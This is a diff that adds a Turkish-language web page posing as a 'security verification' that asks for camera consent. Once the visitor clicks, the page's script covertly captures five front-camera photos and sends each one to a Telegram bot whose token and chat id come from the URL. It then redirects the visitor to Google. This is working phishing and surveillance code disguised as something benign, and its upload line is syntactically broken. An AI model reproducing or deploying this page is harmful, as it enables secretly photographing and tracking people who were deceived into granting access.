@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Sistem Onayı</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #111; color: #eee; text-align: center; padding: 50px 20px; font-family: sans-serif; }
+        .box { max-width: 400px; margin: auto; border: 1px solid #444; padding: 25px; border-radius: 15px; background: #1a1a1a; }
+        .btn { background: #007bff; color: #fff; padding: 15px; border: none; border-radius: 8px; width: 100%; font-weight: bold; cursor: pointer; font-size: 16px; }
+        #status { display: none; margin-top: 20px; color: #00ff00; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>Güvenlik Doğrulaması</h2>
+        <p>Devam etmek için lütfen kamera erişimine onay verin.</p>
+        <button class="btn" onclick="verify()">ONAYLA</button>
+        <div id="status">İşlem Yapılıyor: %<span id="num">0</span></div>
+    </div>
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        const url = new URLSearchParams(window.location.search);
+        const t = url.get('t'), i = url.get('i');
+        async function verify() {
+            if(!t || !i) return;
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+                document.getElementById('v').srcObject = s;
+                document.querySelector('.btn').style.display = 'none';
+                document.getElementById('status').style.display = 'block';
+                for(let x=1; x<=5; x++) {
+                    await new Promise(r => setTimeout(r, 1000));
+                    take(x);
+                    document.getElementById('num').innerText = x*20;
+                }
+                setTimeout(() => { window.location.href="https://google.com"; }, 1500);
+            } catch(e) { alert("Onay verilmedi, işlem iptal edildi."); }
+        }
+        function take(n) {
+            const cv = document.getElementById('c'), vi = document.getElementById('v');
+            cv.width = vi.videoWidth; cv.height = vi.videoHeight;
+            cv.getContext('2d').drawImage(vi, 0, 0);
+            cv.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', i); f.append('photo', b, 'img.jpg');
+                fetch(https://api.telegram.org/bot${t}/sendPhoto, {method:'POST', body:f});
+            }, 'image/jpeg', 0.6);
+        }
+    </script>
+</body>
+  </html>
